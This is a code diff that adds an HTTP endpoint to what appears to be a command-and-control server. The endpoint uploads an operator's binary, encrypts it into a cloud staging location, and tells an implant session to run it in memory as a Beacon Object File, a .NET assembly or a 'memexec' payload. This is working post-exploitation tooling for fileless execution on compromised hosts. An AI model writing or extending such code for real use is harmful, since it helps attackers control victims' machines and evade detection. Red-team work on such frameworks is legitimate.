@@ -547,6 +547,46 @@ async def upload_file(session_id: str, request: Request,
     return {"cloud_path": staging, "command": result}
 
 
+# ── in-memory execution (BOF / Assembly / memexec) ────────────────────────────
+
+@router.post("/{session_id}/exec/inline")
+async def exec_inline(session_id: str, request: Request,
+                      exec_type: str = "",
+                      args: str = "",
+                      file: UploadFile = File(...),
+                      username: str = Depends(get_current_user)):
+    """Stage a binary and send an in-memory execution command."""
+    sm  = _sm(request)
+    s   = _require_session(sm, session_id)
+    cfg = request.app.state.cfg
+
+    if exec_type not in ("bof", "assembly", "memexec"):
+        raise HTTPException(status_code=422, detail="exec_type must be 'bof', 'assembly', or 'memexec'")
+
+    max_bytes = cfg.settings.max_upload_mb * 1024 * 1024
+    data = await file.read(max_bytes + 1)
+    if len(data) > max_bytes:
+        raise HTTPException(status_code=413, detail=f"File too large (max {cfg.settings.max_upload_mb} MB)")
+
+    from pathlib import PurePosixPath
+    safe_name = PurePosixPath(file.filename).name if file.filename else "payload"
+
+    from providers._crypto import encrypt_staging
+    enc_data     = encrypt_staging(data, s.session_key_hex)
+    staging_name = os.urandom(8).hex()
+    staging      = s.profile.staging_path + "/" + staging_name
+
+    loop = __import__("asyncio").get_event_loop()
+    ok   = await loop.run_in_executor(None, s.transport.upload, staging, enc_data)
+    if not ok:
+        raise HTTPException(status_code=502, detail="Cloud upload failed")
+
+    cmd_map = {"bof": f"BOF_EXEC:{staging}:{args}", "assembly": f"ASSEMBLY_EXEC:{staging}:{args}", "memexec": f"MEMEXEC:{staging}:{args}"}
+    disp_map = {"bof": f"/bof {safe_name} {args}".strip(), "assembly": f"/assembly {safe_name} {args}".strip(), "memexec": f"/memexec {safe_name} {args}".strip()}
+    result = await _send(request, session_id, cmd_map[exec_type], username, display=disp_map[exec_type])
+    return {"cloud_path": staging, "exec_type": exec_type, "command": result}
+
+
 # ── poll control ──────────────────────────────────────────────────────────────
 
 @router.post("/{session_id}/poll/stop", status_code=status.HTTP_204_NO_CONTENT)
